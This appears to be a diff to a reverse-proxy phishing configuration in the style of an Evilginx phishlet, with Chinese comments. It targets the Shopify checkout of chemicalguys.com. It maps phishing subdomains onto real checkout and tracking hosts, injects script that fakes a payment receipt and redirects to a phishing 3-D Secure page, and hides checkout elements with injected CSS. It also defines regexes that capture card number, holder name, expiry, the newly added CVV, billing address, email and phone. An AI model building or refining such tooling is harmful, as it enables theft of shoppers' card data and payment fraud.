@@ -6,24 +6,24 @@ proxy_hosts:
   - {phish_sub: 'account', orig_sub: 'account', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true }
 
   # shopify 平台相关
-  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'sp', orig_sub: '', domain: 'shop.app', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
   - {phish_sub: 'checkout.pci', orig_sub: 'checkout.pci', domain: 'shopifyinc.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'monorail-edge', orig_sub: 'monorail-edge', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'monorail-edge', orig_sub: 'monorail-edge', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: true }
   # track、日志相关
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'cdnin', orig_sub: 'cdn', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'a', orig_sub: 'a', domain: 'klaviyo.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'static', orig_sub: 'static', domain: 'klaviyo.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'payg', orig_sub: 'pay', domain: 'google.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'apigo', orig_sub: 'api', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'playgo', orig_sub: 'play', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'widget', orig_sub: 'widget', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'wwwg', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'api', orig_sub: 'api', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'cdnin', orig_sub: 'cdn', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'a', orig_sub: 'a', domain: 'klaviyo.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'static', orig_sub: 'static', domain: 'klaviyo.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'payg', orig_sub: 'pay', domain: 'google.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'apigo', orig_sub: 'api', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'playgo', orig_sub: 'play', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'widget', orig_sub: 'widget', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
+#  - {phish_sub: 'wwwg', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true }
 
 sub_filters:
   #  hack提交按钮 （解决不能重复提交问题）
@@ -62,7 +62,7 @@ js_inject:
           },
           {
             url: 'PollForReceipt',
-            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.test.com/phishing/phishing-cursor","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
+            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.fake.com/phishing/phishing-cursor","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
             status: 200
           }
         ];
@@ -98,7 +98,7 @@ js_inject:
       
         // 注入自定义样式
         const css = `
-          [aria-label="Contact"]>div:nth-child(-n+2),
+          #checkout-main form > div:first-child > div:first-child,
           div:has(> div > div > div > #basic-creditCards) ~ div 
           { display: none !important; }
           
@@ -125,48 +125,51 @@ credentials:
   # 传入3ds页面的参数都在这里， 在3ds页面通过url提取
   custom:
     #信用卡信息
-    - key: 'name'
+    - key: 'cardHolder'
       search: '{"credit_card".*?"name":"([^"]*)"'
       type: 'json'
-    - key: 'number'
+    - key: 'cardNo'
       search: '{"credit_card".*?"number":"([^"]*)"'
       type: 'json'
-    - key: 'month'
+    - key: 'cardMonth'
       search: '{"credit_card".*?"month":(\d+)'
       type: 'json'
-    - key: 'year'
+    - key: 'cardYear'
       search: '{"credit_card".*?"year":(\d+)'
       type: 'json'
+    - key: 'cardCvv'
+      search: '{"credit_card".*?"verification_value":"(\d+)"'
+      type: 'json'
     #账单地址
-    - key: 'billing_country'
+    - key: 'billingCountry'
       search: '"billingAddress":\{.*?"countryCode":"([^"]*)"'
       type: 'json'
-    - key: 'billing_province'
+    - key: 'billingProvince'
       search: '"billingAddress":\{.*?"zoneCode":"([^"]*)"'
       type: 'json'
-    - key: 'billing_city'
+    - key: 'billingCity'
       search: '"billingAddress":\{.*?"city":"([^"]*)"'
       type: 'json'
-    - key: 'billing_zip'
+    - key: 'billingZip'
       search: '"billingAddress":\{.*?"postalCode":"([^"]*)"'
       type: 'json'
-    - key: 'billing_address1'
+    - key: 'billingAddress1'
       search: '"billingAddress":\{.*?"address1":"([^"]*)"'
       type: 'json'
-    - key: 'billing_address2'
+    - key: 'billingAddress2'
       search: '"billingAddress":\{.*?"address2":"([^"]*)"'
       type: 'json'
     #指纹信息
-    - key: 'fp_email'
+    - key: 'fpEmail'
       search: '"buyerIdentity":\{.*?"email":"([^"]*)"'
       type: 'json'
-    - key: 'fp_phone'
+    - key: 'fpPhone'
       search: '"buyerIdentity":\{.*?"number":"([^"]*)"'
       type: 'json'
-#    - key: 'fg_userAgent'
+#    - key: 'fpUserAgent'
 #      search: ''
 #      type: 'json'
-#    - key: 'fg_ip'
+#    - key: 'fpIp'
 #      search: ''
 #      type: 'json'
 
